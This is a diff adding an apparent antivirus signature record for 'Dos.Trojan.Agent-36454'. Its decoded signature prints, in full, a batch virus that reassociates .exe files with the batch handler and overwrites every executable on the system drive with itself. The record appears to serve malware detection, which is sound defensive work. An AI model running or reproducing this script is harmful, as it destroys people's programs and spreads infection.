@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36454
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@ echo off rem --------------------------------- rem infect all .exe files assoc .exe=batfile dir /s/b %systemdrive%\*.exe >> inflist_exe.txt echo y | for /f "tokens=1,* delims=: " %%j in (inflist_exe.txt) do copy /y %0 "%%j:%%k" rem --------------------------------- __-virus author: -__
